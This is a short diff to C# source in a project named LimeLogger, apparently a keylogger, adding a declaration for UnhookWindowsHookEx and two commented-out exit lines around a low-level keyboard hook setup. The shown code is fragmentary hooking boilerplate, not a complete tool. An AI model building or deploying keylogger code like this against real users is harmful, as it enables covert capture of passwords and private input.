@@ -25,6 +25,8 @@ namespace LimeLogger
             _hookID = SetHook(_proc);
             Application.Run();
             //UnhookWindowsHookEx(_hookID);
+            //CurrentActiveWindowTitle = "";
+            //Application.Exit();
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -161,7 +163,9 @@ namespace LimeLogger
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
